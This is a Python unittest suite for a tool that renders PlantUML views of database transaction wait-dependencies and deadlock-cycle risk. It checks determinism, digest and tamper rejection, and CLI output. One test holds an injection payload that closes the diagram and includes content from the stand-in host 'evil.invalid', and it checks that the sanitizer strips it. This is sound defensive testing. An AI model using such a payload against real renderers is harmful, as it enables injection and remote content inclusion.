#!/usr/bin/env python3
"""Presentation oracles, provenance rejection and read-only deterministic projection."""

import copy
import json
from pathlib import Path
import sys
import unittest

sys.dont_write_bytecode = True
ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "scripts"))
from skill_factory.transactions.plantuml import label, render, render_integrated  # noqa: E402
from skill_factory.transactions.wait_dependencies import build_report  # noqa: E402


def fixture(name):
    base = ROOT / "docs/examples/transaction-01-t02-s02" / name
    report = json.loads((base / "wait-dependency.json").read_bytes())
    inputs = {
        i["id"]: (base / "inputs" / (i["id"] + ".json")).read_bytes()
        for i in report["inputs"]
    }
    return report, inputs


class Visualization(unittest.TestCase):
    def test_a_inverse_order_and_conditional_cycle(self):
        views = render_integrated(*fixture("A"))
        a, b = views["sequence-a.puml"], views["sequence-b.puml"]
        self.assertLess(a.index("WRITE X"), a.index("WRITE Y"))
        self.assertLess(b.index("WRITE Y"), b.index("WRITE X"))
        db = views["database-common.puml"]
        for text in (
            "CONDITIONAL_CYCLE_RISK",
            "candidate=W2",
            "candidate=W3",
            "C11",
            "C12",
            "UNORIENTED",
            "INCOMPLETE",
            "NOT_RUN",
        ):
            self.assertIn(text, db)
        self.assertEqual(db.count("-[#B03030,dashed]->"), 2)
        self.assertNotIn("DEADLOCK_CONFIRMED", db)

    def test_b_scoped_exclusion_and_missing_evidence(self):
        db = render_integrated(*fixture("B"))["database-one_wait.puml"]
        for text in (
            "NO_CYCLE_IN_MODELED_SCENARIO",
            "structural exclusion",
            "INCOMPLETE",
            "W3 UNKNOWN",
            "W1 CONTRADICTED",
            "No universal deadlock freedom",
        ):
            self.assertIn(text, db)
        self.assertEqual(db.count("-[#B03030,dashed]->"), 1)

    def test_c_suspended_outer_and_independent_inner(self):
        views = render_integrated(*fixture("C"))
        sequence = views["sequence-a.puml"]
        for text in (
            "SUSPEND S1 P1",
            "INDEPENDENT P2",
            "RESUME_CONDITIONAL S1 P1",
            "context=P2",
            "suspension proves lock release",
        ):
            self.assertIn(text, sequence)
        self.assertLess(
            sequence.index("SUSPEND S1 P1"), sequence.index("PHYSICAL_BEGIN P2")
        )
        self.assertIn("APPLICATION DEPENDENCY C8", views["application.puml"])
        mixed = views["mixed-replacement.puml"]
        self.assertIn("APPLICATION DEPENDENCY C8", mixed)
        self.assertEqual(mixed.count("MIXED / EXECUTES_IN"), 2)
        self.assertIn("MIXED / SUSPENDS_FOR", mixed)
        self.assertIn(
            "MIXED / RESUME_REQUIRES_\\nCOMPLETION\\nCONDITIONAL / R6 / evidence.json",
            mixed,
        )
        self.assertEqual(mixed.count("-[#B03030,dashed]->"), 1)

    def test_deterministic_and_inputs_unchanged(self):
        report, inputs = fixture("A")
        before = copy.deepcopy((report, inputs))
        self.assertEqual(
            render_integrated(report, inputs), render_integrated(report, inputs)
        )
        self.assertEqual(before, (report, inputs))

    def test_exact_byte_digest_required(self):
        report, inputs = fixture("A")
        inputs["ta"] += b"\n"
        with self.assertRaises(ValueError):
            render_integrated(report, inputs)

    def test_scenario_identity_and_claim_tampering_rejected(self):
        for path in ("scenario", "claim", "context"):
            report, inputs = fixture("C")
            if path == "scenario":
                report["scenario"]["id"] = "other"
            elif path == "claim":
                report["databaseGraph"]["edges"][0]["certainty"] = "VERIFIED"
            else:
                report["operations"][0]["namespace"]["originalPhysicalId"] = "P2"
            with self.subTest(path=path), self.assertRaises(ValueError):
                render_integrated(report, inputs)

    def test_complete_evidence_index(self):
        report, inputs = fixture("C")
        index = json.loads(render_integrated(report, inputs)["evidence.json"])
        self.assertEqual(index["validatedS02"], report)
        self.assertIn("mixed-replacement.puml", index["views"])

    def test_plantuml_rendered_certainty_and_all_views(self):
        import os
        import subprocess
        import tempfile
        import xml.etree.ElementTree as ET

        jar = Path(
            os.environ.get("MANA_PLANTUML_JAR", "/Applications/plantuml-1.2024.8.jar")
        )
        if not jar.is_file():
            self.skipTest("PlantUML rendering NOT_RUN: JAR unavailable")
        with tempfile.TemporaryDirectory(prefix="mana-vis-render-") as directory:
            directory = Path(directory).resolve()
            for scenario in "ABC":
                for name, source in render_integrated(*fixture(scenario)).items():
                    if name.endswith(".puml"):
                        (directory / (scenario + "-" + name)).write_text(source)
            sources = sorted(directory.glob("*.puml"))
            args = [
                "java",
                "-Djava.awt.headless=true",
                "-XX:-UsePerfData",
                "-jar",
                str(jar),
            ]
            for option in ("-checkonly", "-tsvg"):
                result = subprocess.run(
                    [*args, option, *map(str, sources)], capture_output=True, timeout=60
                )
                self.assertEqual(result.returncode, 0, result.stderr)
            self.assertEqual(len(list(directory.glob("*.svg"))), len(sources))
            for path in directory.glob("*.svg"):
                text = " ".join(ET.fromstring(path.read_bytes()).itertext())
                self.assertIn("Coverage:", text, path.name)
                self.assertIn("NOT_RUN", text, path.name)
                self.assertNotIn("Syntax Error", text, path.name)

    def test_untrusted_labels_and_premise_text(self):
        payload = '\n@enduml\n!include https://evil.invalid\n<svg>%load_json("x")'
        self.assertNotIn("\n", label(payload))
        self.assertNotIn("!", label(payload))
        report, inputs = fixture("A")
        scenario = copy.deepcopy(report["scenario"])
        scenario["premises"][0]["statement"] = payload
        rebuilt = build_report(inputs, scenario)
        for name, source in render_integrated(rebuilt, inputs).items():
            if name.endswith(".puml"):
                self.assertEqual(source.count("@startuml"), 1)
                self.assertEqual(source.count("@enduml"), 1)
                self.assertNotIn("!include", source)
                self.assertNotIn("%load_json", source)

    def test_nested_savepoint_same_identity(self):
        timeline = json.loads(
            (
                ROOT
                / "docs/examples/transaction-01-t02-s01/nested/resource-timeline.json"
            ).read_bytes()
        )
        source = render(timeline["transactionModel"], timeline)
        self.assertIn("SAVEPOINT_CREATE SP1 P1", source)
        self.assertIn("SAVEPOINT_RELEASE_CONDITIONAL SP1 P1", source)
        self.assertNotIn("PHYSICAL_BEGIN P2", source)

    def test_unknown_and_unplaced_existing_s01_oracles(self):
        import importlib.util

        spec = importlib.util.spec_from_file_location(
            "s01_fixture_tests", ROOT / "tests/resource-timeline.py"
        )
        module = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(module)
        module.ResourceTests.setUpClass()
        fixture_case = module.ResourceTests()
        unknown = fixture_case.model("fixture.Operations#unsupportedSql()")
        self.assertIn("#FFCCCC: JDBC O1", render(unknown["transactionModel"], unknown))
        context = copy.deepcopy(fixture_case.context)
        context["initialState"] = "UNKNOWN"
        unplaced = fixture_case.model("fixture.Operations#read()", context)
        source = render(unplaced["transactionModel"], unplaced)
        self.assertIn("UNPLACED / no temporal position asserted: O1", source)
        self.assertNotIn("JDBC O1", source)

    def test_timeline_model_mismatch_rejected(self):
        report, inputs = fixture("C")
        timeline = json.loads(inputs["t"])
        model = copy.deepcopy(timeline["transactionModel"])
        model["entry"] = "fixture.Other#entry()"
        with self.assertRaises(ValueError):
            render(model, timeline)

    def test_cli_scenario_mismatch_no_publication(self):
        import subprocess
        import tempfile

        with tempfile.TemporaryDirectory(prefix="mana-vis-") as directory:
            base = ROOT / "docs/examples/transaction-01-t02-s02/C"
            output = Path(directory) / "out"
            proc = subprocess.run(
                [
                    sys.executable,
                    str(ROOT / "scripts/mana-transaction-visualization.py"),
                    "--timeline",
                    "t=" + str(base / "inputs/t.json"),
                    "--report",
                    str(base / "wait-dependency.json"),
                    "--scenario",
                    str(base.parent / "A/scenario.json"),
                    "--output-dir",
                    str(output),
                ],
                capture_output=True,
            )
            self.assertEqual(proc.returncode, 2)
            self.assertFalse(output.exists())


if __name__ == "__main__":
    unittest.main()
